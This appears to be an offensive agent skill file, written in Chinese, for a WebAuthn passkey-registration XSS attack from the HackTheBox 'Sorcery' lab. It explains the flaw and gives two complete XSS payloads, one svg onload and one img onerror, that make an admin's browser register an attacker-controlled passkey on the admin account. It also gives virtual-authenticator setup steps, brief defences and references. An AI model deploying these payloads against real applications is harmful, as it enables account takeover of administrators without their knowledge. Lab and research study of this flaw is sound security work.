---
name: 'webauthn-xss'
description: 'WebAuthn注册XSS攻击：credential.name不转义→注入JS→admin浏览器自动完成WebAuthn注册→攻击者passkey绑定admin账户。Sorcery靶机Step 2关键攻击面。'
disable-model-invocation: true
metadata: { domain: web, tier: T3 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## WebAuthn/Passkey Registration XSS

### 原理
WebAuthn 注册流程中，`credential.name` 字段如果在管理页面渲染时不转义 → XSS → 攻击者注入 JS → 在 admin 浏览器中自动完成 WebAuthn 注册仪式 → 攻击者的认证器绑定到 admin 账户 → 无需密码即可登录。

### 攻击前提
1. 应用允许注册 Passkey/WebAuthn
2. `credential.name`（或任何注册时用户提供的字段）在管理页渲染时不转义
3. 存在 XSS 注入点（管理页面查看用户提交的内容）
4. 浏览器有 WebAuthn 模拟器（Chrome DevTools → More tools → WebAuthn）

### 典型 Payload（Sorcery HTB）
在可被 admin 查看的页面注入 XSS（如产品描述、passkey 名称等）：

```html
<svg/onload="
fetch('/api/webauthn/register/initiate',{method:'POST'})
.then(r=>r.json())
.then(c=>{
  navigator.credentials.create({
    publicKey: {
      rp: c.rp,
      user: {id:new Uint8Array(16), name:'admin', displayName:'admin'},
      challenge: c.challenge,
      pubKeyCredParams: c.pubKeyCredParams,
      attestation: 'none',
      authenticatorSelection: {authenticatorAttachment:'cross-platform',residentKey:'required',userVerification:'discouraged'}
    }
  })
  .then(cred=>{
    fetch('/api/webauthn/register/complete',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({
        id:btoa(String.fromCharCode(...new Uint8Array(cred.rawId))),
        rawId:btoa(String.fromCharCode(...new Uint8Array(cred.rawId))),
        response:{
          attestationObject:btoa(String.fromCharCode(...new Uint8Array(cred.response.attestationObject))),
          clientDataJSON:btoa(String.fromCharCode(...new Uint8Array(cred.response.clientDataJSON)))
        },
        type:'public-key'
      })
    })
  })
})">
```

### 简化版（如果 API 接受标准 WebAuthn JSON）
```html
<img src=x onerror="
fetch('/api/admin/webauthn/register/initiate',{method:'POST'})
.then(r=>r.json()).then(c=>{
  navigator.credentials.create({publicKey:{...c,user:{id:Uint8Array.from('admin'.split('').map(c=>c.charCodeAt(0))),name:'admin',displayName:'admin'}}})
  .then(cred=>fetch('/api/admin/webauthn/register/complete',{method:'POST',body:JSON.stringify(cred)}))
})">
```

### Chrome DevTools 配置
1. F12 → ⋮ → More tools → WebAuthn
2. 勾选 "Enable virtual authenticator environment"
3. 添加 New authenticator (ctap2, userVerification: discouraged, residentKey: required)

### 防御
- `credential.name` 等用户可控字段必须在渲染时转义
- WebAuthn `attestation` 应为 `direct` 或 `enterprise`（非 `none`）→ 验证认证器真实性
- 不要接受 `userVerification: discouraged` 的高敏感操作

### 参考
- Scott Helme: "XSS Is Deadly for Passkeys: The Hidden Risk of Attestation None"
- SquareX Labs: "Passkeys Pwned: Turning WebAuth Against Itself"
- Sorcery HTB (0xdf writeup): https://0xdf.gitlab.io/2026/04/25/htb-sorcery.html
